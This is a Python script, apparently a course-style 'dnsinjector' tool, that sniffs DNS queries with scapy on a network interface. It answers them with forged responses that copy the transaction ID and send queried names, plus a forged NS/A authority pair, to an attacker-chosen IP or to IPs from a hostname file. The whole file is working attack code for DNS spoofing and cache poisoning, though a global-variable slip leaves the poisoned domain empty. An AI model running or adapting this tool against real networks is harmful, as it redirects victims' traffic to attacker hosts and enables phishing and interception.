import sys
import scapy.all as scapy
import random
import string
import threading

# Get list of network interfaces available on the system
ip = scapy.get_if_list()
print(ip)

# Default settings
interface = "wlan0"  # The interface to use for sniffing DNS traffic
attacker_ip = scapy.get_if_addr(interface)  # The IP address you want to inject as the default forged response
domain_to_poison = '' # The domain you are attempting to poison
num_threads = 10  # Number of threads to run in parallel for brute-forcing the response
port_range = range(1024, 65535)  # Possible range of source ports to randomize
hostnames = {}  # Dictionary to hold IP-hostname pairs from the hostname file

# Function to generate random subdomains (e.g., foo1.example.com)
def generate_random_subdomain(domain):
    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
    return f"{random_string}.{domain}"

# Function to process intercepted DNS packets
def process_packet(packet):
    """
    This function processes each DNS packet that is intercepted. It checks for the DNS layer,
    extracts important information like source/destination IPs and ports, and checks if the DNS
    query is for the domain you want to poison.
    """
    # Check if the packet contains a DNS layer
    if scapy.DNS in packet:
        dns_layer = packet[scapy.DNS]
        txid = dns_layer.id  # Extract the Transaction ID (TxID) from the DNS query

        # Extract source and destination IP and port information
        src_ip = packet[scapy.IP].src  # The IP address of the client making the DNS query
        dst_ip = packet[scapy.IP].dst  # The IP address of the DNS resolver/server

        # Check if it's using UDP or TCP and extract source/destination ports accordingly
        if scapy.TCP in packet:
            src_port = packet[scapy.TCP].sport  # Source port from the client
            dst_port = packet[scapy.TCP].dport  # Destination port (53 for DNS)
        elif scapy.UDP in packet:
            src_port = packet[scapy.UDP].sport  # Source port from the client
            dst_port = packet[scapy.UDP].dport  # Destination port (53 for DNS)

        # Filter for DNS queries (qr == 0 means it's a query, not a response)
        if dns_layer.qr == 0:
            query = dns_layer.qd.qname.decode('utf-8')  # Extract the queried domain name

            # Check if the queried domain matches any in the hostname file or if we should use the default
            hijack_ip = get_hijack_ip(query)

            if hijack_ip:
                print(f"Hijacking DNS request for {query}: {dns_layer.show()}")
                print(f"Source IP: {src_ip}, Source Port: {src_port}, TxID: {txid}")
                print(f"Destination IP: {dst_ip}, Destination Port: {dst_port}")

                # Use a separate thread to handle the response so that the DNS query is processed
                # without being blocked by further sniffing
                threading.Thread(target=handle_dns_response, 
                                 args=(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port)).start()

# Function to get the hijack IP based on the queried domain
def get_hijack_ip(query):
    """
    Returns the IP to use for hijacking based on the queried domain. If a hostname file is provided,
    it checks if the queried domain matches any hostnames in the file. Otherwise, it returns the 
    default attacker's IP (attacker_ip).
    """
    # Strip any trailing dot from the domain name
    query = query.rstrip('.')
    
    # Check if the query matches any hostnames in the loaded hostname file
    if query in hostnames:
        return hostnames[query]  # Return the IP from the hostname file

    # If no match is found in the hostname file, return the default attacker's IP
    return attacker_ip

# Function to handle DNS response in a separate thread
def handle_dns_response(txid, query, hijack_ip, src_ip, src_port, dst_ip, dst_port):
    """
    Handles the DNS response by generating a forged DNS response and sending it to the victim.
    This is done in a separate thread for each DNS query to avoid blocking.
    """
    # Craft the DNS payload (forged response)
    forged_payload = dns_payload(txid, query, hijack_ip)

    # Send the forged DNS packet
    send_packet(src_ip=dst_ip, dst_ip=src_ip, dst_port=src_port, payload=forged_payload)

# Function to generate a forged DNS payload (response)
def dns_payload(txid, query, hijack_ip):
    """
    Creates a forged DNS response payload that includes the original TxID and query, 
    but returns a forged IP (hijack_ip) for the domain.
    """
    payload = scapy.DNS(
        id=txid,  # Set the TxID to match the one from the query
        qr=1,  # qr = 1 means this is a response
        aa=1,  # Authoritative answer
        ra=1,  # Recursion Available
        qdcount=1,  # Number of questions
        ancount=0,  # No answers for this specific forged response
        nscount=1,  # Number of authority records (NS)
        arcount=1   # Number of additional records (A record)
    )

    # Add the original query in the Question Section
    payload.qd = scapy.DNSQR(qname=query, qtype="A", qclass="IN")

    # Add the Authority Section (NS record for the forged domain)
    payload.ns = scapy.DNSRR(rrname=domain_to_poison, type="NS", rdata=f"ns1.{domain_to_poison}", ttl=84600)

    # Add the Additional Section (A record pointing ns1.example.com to the hijacked IP)
    payload.ar = scapy.DNSRR(rrname=f"ns1.{domain_to_poison}", type="A", ttl=604800, rdata=hijack_ip)

    return payload

# Function to send the forged DNS packet
def send_packet(src_ip, dst_ip, dst_port, payload):
    """
    Sends a forged DNS packet back to the client.
    src_ip: The source IP for the packet (which will be the DNS server)
    dst_ip: The destination IP (the client)
    dst_port: The client's port that sent the DNS query
    payload: The forged DNS response to send back
    """
    ip_packet = scapy.IP(src=src_ip, dst=dst_ip)  # IP layer
    udp_segment = scapy.UDP(dport=dst_port)  # UDP layer
    final_packet = ip_packet / udp_segment / payload  # Full packet (IP + UDP + DNS)
    scapy.send(final_packet)  # Send the packet
    
    
def extract_authoritative_domain(domain):
    """
    Extracts the authoritative domain name from a full domain.
    For example, 'foo.example.com' returns 'example.com', and 'www.cs.uic.edu' returns 'uic.edu'.
    """
    parts = domain.split('.')
    
    # For valid domain names, the last two parts are the authoritative domain (e.g., example.com, uic.edu)
    if len(parts) >= 2:
        return '.'.join(parts[-2:])  # Join the last two components
    else:
        return domain

# Function to load the hostname file if provided
def load_hostname_file(filename):
    """
    Loads a hostname file containing IP-hostname pairs. The file should contain lines where each line 
    has an IP address and a hostname separated by a comma (e.g., 192.168.1.1,example.com).
    """
    global hostnames
    try:
        with open(filename, 'r') as file:
            for line in file:
                # Split each line into IP and hostname using a comma
                ip, hostname = line.strip().split(',')
                hostnames[hostname.strip()] = ip.strip()  # Add to the dictionary
        print(f"Loaded {len(hostnames)} hostnames from {filename}.")
        for full_domain in hostnames:
            domain_to_poison = extract_authoritative_domain(full_domain)
            print(f"Full domain: {full_domain}, Authoritative domain: {domain_to_poison}")
    except FileNotFoundError:
        print(f"Hostname file {filename} not found.")
        sys.exit(1)

# Sniff DNS packets and inject forged responses
def inject():
    """
    Starts sniffing DNS traffic on the specified interface and injects forged responses
    when queries for the target domain are detected.
    """
    print("Starting DNS injection...")
    scapy.sniff(iface=interface, filter="ip and udp port 53", prn=process_packet)

# Command-line argument parsing
def parse_args():
    """
    Parses command-line arguments to get the network interface to sniff on and the hostname file.
    """
    global interface
    
    # Check if the number of arguments is valid
    if len(sys.argv) < 3 or len(sys.argv) > 5:
        print("Usage: dnsinjector.py [-i interface] [-h hostnames]")
        sys.exit(1)

    for i in range(1, len(sys.argv)):
        if sys.argv[i] == "-i":  # Check if interface argument is provided
            interface = sys.argv[i + 1]  # Set the interface for sniffing
        elif sys.argv[i] == "-h":  # Check if hostname file argument is provided
            hostname_file = sys.argv[i + 1]
            load_hostname_file(hostname_file)  # Load hostnames from the file

# Main program entry point
if __name__ == "__main__":
    parse_args()  # Parse command-line arguments
    inject()  # Start sniffing and DNS injection
